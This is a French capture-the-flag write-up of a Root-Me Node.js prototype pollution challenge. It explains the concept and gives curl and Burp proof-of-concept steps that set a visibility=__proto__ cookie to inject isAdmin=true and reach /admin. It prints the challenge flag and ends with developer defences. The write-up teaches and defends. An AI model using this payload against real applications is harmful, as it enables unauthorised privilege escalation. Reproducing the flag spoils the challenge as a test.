# Writeup — Root-Me : Node.js — Prototype Pollution

> **Objectif du challenge** : accéder à la page `/admin` d'une petite application Node.js/Express alors qu'on est un simple utilisateur.
>
> **Flag** : `__pr0t0__.b3_C4r3ful_w1th_Pr0t0typ3`

Ce writeup est volontairement détaillé et pensé pour quelqu'un qui découvre la *prototype pollution*. On part de zéro.

---

## 1. C'est quoi la « prototype pollution » ? (les bases)

En JavaScript, **tous les objets héritent d'un "parent" appelé le prototype**. Ce parent commun s'appelle `Object.prototype`.

Quand tu écris `monObjet.quelqueChose`, JavaScript :
1. regarde si `monObjet` possède lui-même la propriété `quelqueChose` ;
2. sinon, il va la chercher **dans son prototype** (`Object.prototype`).

Exemple concret dans une console Node.js :

```js
const user = {};                 // objet vide
console.log(user.isAdmin);       // undefined  (ni dans user, ni dans le prototype)

Object.prototype.isAdmin = true; // <-- on "pollue" le prototype commun

const autre = {};                // un AUTRE objet vide, tout neuf
console.log(autre.isAdmin);      // true  !!!  il hérite de la pollution
```

👉 **L'idée de l'attaque** : si on arrive à écrire dans `Object.prototype`, alors **tous les objets de l'application** (présents et futurs) héritent de notre propriété. Si le code fait quelque part `if (user.isAdmin) { ... accès admin ... }`, on gagne.

### Comment on atteint `Object.prototype` depuis l'extérieur ?

Il existe un "mot magique" : **`__proto__`**. Sur n'importe quel objet, `obj.__proto__` **pointe vers son prototype**. Donc :

```js
obj["__proto__"]["isAdmin"] = true;   // revient à faire Object.prototype.isAdmin = true
```

La vulnérabilité apparaît quand une application prend **une donnée contrôlée par l'utilisateur** et l'utilise **comme nom de clé** pour écrire dans un objet, sans vérifier que ce nom n'est pas `__proto__`. C'est exactement ce qui se passe ici.

---

## 2. Reconnaissance de l'application

L'appli est un mini réseau social « Root Me - Social Media ». On est déjà connecté (on a un cookie `user` chiffré). Deux fonctionnalités sont proposées :

| Fonctionnalité | Route | Ce qu'elle fait |
|---|---|---|
| **My Profile** | `POST /profile` | Change la visibilité (`public`/`private`) de nos posts |
| **My Post** | `POST /mypost` | Crée un post (`title` + `post`) |
| (voir ses posts) | `GET /createdPosts` | Renvoie nos posts en JSON |
| **La cible** | `GET /admin` | Zone interdite → `403 - You are not an admin.` |

### Les cookies

En observant les requêtes dans le navigateur (ou Burp), on voit trois cookies :

- `user` : une longue valeur chiffrée (notre identité + nos posts). On ne peut pas la lire ni la modifier directement.
- `visibility` : vaut `private` ou `public`.
- (des cookies Google Analytics, sans intérêt)

### Première observation importante

Quand on poste sur `/profile` le corps JSON `{"visibility":"private"}`, le serveur répond en posant un cookie `visibility=private`.
👉 Le serveur **recopie une valeur qu'on contrôle**. C'est un premier signe que des données utilisateur circulent vers des clés/cookies.

---

## 3. Comprendre comment les posts sont stockés

On regarde la réponse de `GET /createdPosts` :

```json
{"public":{},"private":{"test":"test\n"}}
```

La structure est claire : un objet avec deux "tiroirs" `public` et `private`. Dans `private`, il y a un post dont **la clé est le titre** (`test`) et **la valeur est le contenu** (`test\n`).

On en déduit que `/mypost` fait, côté serveur, quelque chose comme :

```js
userData[ visibility ][ title ] = post;
```

où :
- `visibility` vient **du cookie `visibility`** (`public` ou `private`),
- `title` et `post` viennent **du corps JSON** de la requête.

On le confirme par des tests :

- Poster avec `visibility=public` → le post apparaît dans le tiroir `public`. ✅
- Les valeurs gardent leur **type** : poster `{"title":"booltest","post":true}` stocke le booléen `true` (et pas la chaîne `"true"`). ✅ *(ce détail sera crucial)*

### Le détail qui change tout

Le nom du tiroir (`visibility`) est **entièrement contrôlé par nous** (c'est juste un cookie qu'on envoie), et le serveur ne vérifie pas sa valeur. On a même pu créer un tiroir n'importe comment :

```
Cookie: visibility=nimportequoi
Body:   {"title":"a","post":"b"}
→ le serveur accepte et crée userData["nimportequoi"] = {"a":"b"}
```

👉 On a donc une écriture de la forme `userData[ CE_QU_ON_VEUT ][ title ] = post`.
Que se passe-t-il si `CE_QU_ON_VEUT` vaut… `__proto__` ?

---

## 4. L'exploitation

### L'idée

Si on met le cookie `visibility = __proto__`, le serveur exécute :

```js
userData["__proto__"]["isAdmin"] = true;
```

Or `userData["__proto__"]` **pointe vers `Object.prototype`**. On écrit donc :

```js
Object.prototype.isAdmin = true;
```

… et comme la page `/admin` teste probablement `if (user.isAdmin)` sur l'objet utilisateur déchiffré (qui, lui, n'a pas de propriété `isAdmin` à lui), **il va hériter de notre `true`**.

Il faut :
- **le titre = `isAdmin`** (c'est la propriété que le code admin va lire) ;
- **la valeur = `true`** (un vrai booléen, pas une chaîne — le type est préservé par l'appli, et le check côté admin est strict).

### Le piège qui fait échouer 90 % des tentatives

`POST /mypost` **renvoie un nouveau cookie `user`** (en-tête `Set-Cookie`). Pour que `/admin` fonctionne, il faut rappeler `/admin` **avec ce nouveau cookie `user`**, pas l'ancien.

> ⚠️ Attention aussi : la valeur du cookie `user` contient des caractères `+`, `/`, `=`. Si tu l'extrais à la main (copier-coller ou script bash maladroit), tu risques de la **tronquer** et tout échoue silencieusement. Le plus sûr est de laisser l'outil gérer les cookies (le "cookie jar" de curl, ou Burp qui suit automatiquement les `Set-Cookie`).

### Les étapes

1. **Requête 1 — on pollue.** `POST /mypost` avec le cookie `visibility=__proto__` et le corps `{"title":"isAdmin","post":true}`.
   → On récupère le `Set-Cookie: user=...` de la réponse.
2. **Requête 2 — on en profite.** `GET /admin` avec **ce nouveau cookie `user`** (on remet `visibility=private` pour rester propre).
   → La page admin s'affiche, avec le flag.

---

## 5. PoC (preuve de concept)

### Avec `curl` (en laissant curl gérer les cookies)

```bash
BASE="http://challenge01.root-me.org:59076"
U0="<ta_valeur_du_cookie_user_initial>"   # copiée depuis ton navigateur

# On place le cookie user initial dans un "cookie jar"
printf "challenge01.root-me.org\tFALSE\t/\tFALSE\t0\tuser\t%s\n" "$U0" > jar

# 1) Pollution : visibility=__proto__ + title=isAdmin + post=true (attention ici ce n'est pas "true" mais true le booléen)
curl -s -b jar -c jar -b "visibility=__proto__" \
  "$BASE/mypost" \
  -H "Content-Type: application/json" \
  -H "X-Requested-With: XMLHttpRequest" \
  --data '{"title":"isAdmin","post":true}'

# 2) On visite /admin avec le NOUVEAU cookie user (stocké dans jar)
curl -s -b jar -b "visibility=private" "$BASE/admin"
```

Résultat :

```html
<h2>Welcome to Root Me - Social Media! - Admin</h2>
<p>The flag is __pr0t0__.b3_C4r3ful_w1th_Pr0t0typ3</p>
```

### Avec Burp Suite (plus visuel)

1. Intercepte un `POST /mypost`.
2. Dans l'en-tête `Cookie`, remplace `visibility=private` par **`visibility=__proto__`**.
3. Mets le corps JSON à **`{"title":"isAdmin","post":true}`** (garde `Content-Type: application/json`).
4. Envoie. La réponse contient un **`Set-Cookie: user=...`** → laisse Burp le mémoriser (ou copie-le proprement).
5. Fais un `GET /admin` avec **ce nouveau cookie `user`**. 🎉

---

## 6. Pourquoi ça marche — le résumé en une image

```
        TU ENVOIES                        LE SERVEUR EXÉCUTE
  ┌────────────────────────┐      ┌─────────────────────────────────┐
  │ Cookie: visibility=     │      │ userData[ visibility ][ title ] │
  │         __proto__       │ ───► │          = post                 │
  │ Body: {title:"isAdmin", │      │                                 │
  │        post:true}       │      │ = userData["__proto__"]["isAdmin"] = true │
  └────────────────────────┘      │ = Object.prototype.isAdmin = true│
                                   └─────────────────────────────────┘
                                                  │
                                                  ▼
                           GET /admin  ->  if (user.isAdmin) // hérité = true
                                                  │
                                                  ▼
                                           ✅ Accès Admin + Flag
```

---

## 7. Comment se protéger (côté développeur)

Le bug vient de **l'utilisation d'une entrée utilisateur comme nom de clé** sans contrôle. Quelques parades :

1. **Lister les valeurs autorisées (allow-list).** Ici `visibility` ne devrait valoir que `public` ou `private` :
   ```js
   if (!["public", "private"].includes(visibility)) return res.status(400).end();
   ```
2. **Bloquer les clés dangereuses** : `__proto__`, `constructor`, `prototype`.
3. **Utiliser des structures sûres** :
   - `Map` au lieu d'objets simples (`map.set(key, value)` ne touche jamais le prototype) ;
   - ou des objets sans prototype : `Object.create(null)`.
4. **Geler le prototype** au démarrage : `Object.freeze(Object.prototype)` (défense en profondeur).
5. **Ne jamais se fier au client** pour un contrôle d'accès : l'état "admin" doit venir du serveur (session signée côté serveur), pas d'une propriété devinable.

---

## 8. Ce qu'il faut retenir

- La prototype pollution se produit quand une **donnée utilisateur devient un nom de clé** (`obj[entrée] = ...`) sans filtrage.
- Le vecteur universel est le mot-clé **`__proto__`** (ou `constructor.prototype`).
- Ici, l'entrée vulnérable n'était pas évidente : c'était **le cookie `visibility`**, réutilisé comme clé de tiroir dans `/mypost`.
- Détail opérationnel décisif : **réutiliser le nouveau cookie `user`** renvoyé par la requête de pollution, et **ne pas corrompre** sa valeur lors du copier-coller.

**Flag :** `__pr0t0__.b3_C4r3ful_w1th_Pr0t0typ3`
